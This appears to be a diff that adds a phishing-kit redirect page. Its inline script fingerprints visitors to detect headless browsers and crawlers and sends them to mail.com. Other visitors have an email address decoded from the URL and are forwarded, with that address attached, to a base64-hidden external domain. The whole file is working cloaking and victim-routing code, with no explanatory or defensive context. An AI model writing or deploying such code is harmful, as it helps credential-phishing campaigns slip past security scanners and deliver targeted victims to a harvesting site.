@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Redirecting...</title>
+  <style>body{background:#f8f9fa;}</style>
+</head>
+<body>
+  <script>
+    (function() {
+      // === CONFIG ===
+      var redirectTargetsB64 = [ "aHR0cHM6Ly9jcmVtZXJuYWNhcmVlcnMudXMvUnpGeUJ3Y1A=" ]; // destination URL(s), base64
+      var BLOCK_REDIRECT_URL = "https://mail.com"; // bot redirect URL
+
+      // === Antibot Detection (aggressive) ===
+      function detectBotsSync(callback){
+        var score=0;
+        if(navigator.webdriver)score+=1.0;
+        if(window._phantom||window.__nightmare||window.callPhantom)score+=1.0;
+        if(/HeadlessChrome/.test(navigator.userAgent))score+=1.0;
+        var ua=(navigator.userAgent||"").toLowerCase();
+        var suspiciousUA=['phantomjs','slimerjs','puppeteer','selenium','headless','crawler','spider','bot','httpclient','curl','wget','libwww-perl'];
+        for(var i=0;i<suspiciousUA.length;i++){if(ua.indexOf(suspiciousUA[i])!==-1)score+=0.8;}
+        try{
+          if(!navigator.languages||navigator.languages.length===0)score+=0.5;
+          if(!navigator.plugins||navigator.plugins.length===0)score+=0.5;
+        }catch(e){}
+        try{
+          if(typeof navigator.maxTouchPoints==='number'&&navigator.maxTouchPoints===0&&('ontouchstart'in window)){score+=0.2;}
+        }catch(e){}
+        var t0=performance.now(),rafDone=false;
+        requestAnimationFrame(function(){
+          var rafElapsed=performance.now()-t0;
+          rafDone=true;
+          if(rafElapsed>200)score+=0.5;
+          // Canvas fingerprint
+          try{
+            var cvs=document.createElement('canvas');cvs.width=200;cvs.height=50;
+            var ctx=cvs.getContext('2d');
+            ctx.textBaseline='top';ctx.font='16px Arial';
+            ctx.fillStyle='#f60';ctx.fillRect(0,0,200,50);
+            ctx.fillStyle='#069';ctx.fillText('antibot-tester',2,2);
+            var data=cvs.toDataURL();
+            if(!data||data.length<200)score+=0.3;
+          }catch(e){score+=0.3;}
+          // Audio fingerprint
+          try{
+            var AudioCtx=window.OfflineAudioContext||window.webkitOfflineAudioContext;
+            if(AudioCtx){
+              var ac=new AudioCtx(1,256,44100);
+              var osc=ac.createOscillator();
+              var gain=ac.createGain();
+              osc.connect(gain);gain.connect(ac.destination);osc.start(0);
+              ac.startRendering().then(function(){callback(score);}).catch(function(){callback(score+0.2);});
+              return;
+            }else{score+=0.1;}
+          }catch(e){score+=0.2;}
+          callback(score);
+        });
+        setTimeout(function(){ if(!rafDone)callback(score+0.5);},100);
+      }
+
+      // === Email Extraction/Decoding ===
+      function atobSafe(s){ try{return atob(s);}catch(e){return null;} }
+      function urlSafeToBase64(s){ if(!s)return s; s=s.replace(/-/g,'+').replace(/_/g,'/'); while(s.length%4)s+='='; return s; }
+      function looksLikeEmail(s){
+        if(!s||typeof s!=='string')return false;
+        s=s.trim();
+        if(s.indexOf(' ')!==-1)return false;
+        var at=s.indexOf('@');
+        if(at<=0)return false;
+        var dotAfter=s.indexOf('.',at);
+        return dotAfter>at+1;
+      }
+      function tryDecodes(candidate){
+        if(!candidate||typeof candidate!=='string')return null;
+        var decoded=candidate;
+        try{decoded=decodeURIComponent(candidate);}catch(e){}
+        if(looksLikeEmail(decoded))return decoded;
+        var dec=atobSafe(candidate);
+        if(dec&&looksLikeEmail(dec))return dec;
+        dec=atobSafe(urlSafeToBase64(candidate));
+        if(dec&&looksLikeEmail(dec))return dec;
+        try{
+          var udec=decodeURIComponent(candidate);
+          dec=atobSafe(udec);
+          if(dec&&looksLikeEmail(dec))return dec;
+        }catch(e){}
+        try{
+          var once=atobSafe(candidate);
+          if(once){
+            var twice=atobSafe(once);
+            if(twice&&looksLikeEmail(twice))return twice;
+          }
+        }catch(e){}
+        try{
+          var onceSafe=atobSafe(urlSafeToBase64(candidate));
+          if(onceSafe){
+            var twiceSafe=atobSafe(onceSafe);
+            if(twiceSafe&&looksLikeEmail(twiceSafe))return twiceSafe;
+          }
+        }catch(e){}
+        return null;
+      }
+      function findEmailFromURL(){
+        var href=window.location.href||'';
+        var candidates=[];
+        if(window.location.hash) candidates.push(window.location.hash.substring(1));
+        try{
+          var qs=new URLSearchParams(window.location.search);
+          for(var pair of qs.entries()) candidates.push(pair[1]);
+        }catch(e){}
+        (window.location.pathname||'').split('/').forEach(function(s){if(s)candidates.push(s);});
+        var tokenRegex=/[A-Za-z0-9\-_]{12,}={0,2}/g;
+        var tokens=href.match(tokenRegex)||[];
+        tokens.forEach(function(t){candidates.push(t);});
+        for(var i=0;i<candidates.length;i++){
+          var email=tryDecodes(candidates[i]);
+          if(email)return email;
+        }
+        return null;
+      }
+
+      // === Main Logic ===
+      detectBotsSync(function(botScore){
+        if(botScore >= 1.0){
+          window.location.replace(BLOCK_REDIRECT_URL);
+          return;
+        }
+        var extractedEmail=findEmailFromURL();
+        if(extractedEmail && looksLikeEmail(extractedEmail)){
+          var baseURL = atobSafe(redirectTargetsB64[0]) || redirectTargetsB64[0];
+          window.location.replace(baseURL+'#'+extractedEmail);
+        }
+        // If no valid email, do nothing (page remains blank)
+      });
+    })();
+  </script>
+</body>
+</html>
